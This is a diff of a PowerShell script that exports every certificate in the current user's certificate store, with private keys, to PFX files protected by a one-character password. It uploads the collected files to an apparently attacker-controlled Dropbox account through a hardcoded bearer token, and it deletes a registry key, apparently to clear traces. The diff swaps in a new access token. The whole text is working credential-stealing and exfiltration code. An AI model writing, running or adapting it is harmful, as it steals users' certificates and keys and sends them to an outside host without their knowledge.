@@ -3,7 +3,7 @@ trap{C:\Windows\System32\reg.exe delete HKEY_CURRENT_USER\Software\Microsoft\Win
 function send($f) {
     $TargetFilePath = "/c/$f"
     $SourceFilePath = "C:\ProgramData\cloudpath_data\found\$f"
-    $token = "sl.BvPzAJGLlHUCJioU7GflsH26yulmJRHh9YzqU9d4baMoBFJnAo1rJcrrtPzYpei8LOSQXOiwXf4PBAP0rThKoMBYJjKk8sK209BUNy150MKMFVX3hQeAo3rNV3_Rzy1DimXwm_DL-kiZ"
+    $token = "sl.BvM6t_OKjG4Kgw9R4xUuIEPG4nExfWBuJc8Fx0TFjcY0SZ0MkZebzn3HQzQ5XRAVPCQFRpBkMe3CdpKQMDO5Q2lXghXkz16PJRqXkN585dPac2jJ5QkoOQxvW1v0Sr-3z3HmIe516TUo"
     $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
     $authorization = "Bearer " + $token
     $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
@@ -15,7 +15,7 @@ function send($f) {
 
 C:
 cd C:\ProgramData\cloudpath_data\
-trap{mkdir found}
+mkdir found
 cd found
 $p = ConvertTo-SecureString -String '.' -Force -AsPlainText
 gci Cert:\CurrentUser\My\|%{try{Export-PfxCertificate $_ "C:\ProgramData\cloudpath_data\found\$($_.Thumbprint)" -Password $p}catch{}}
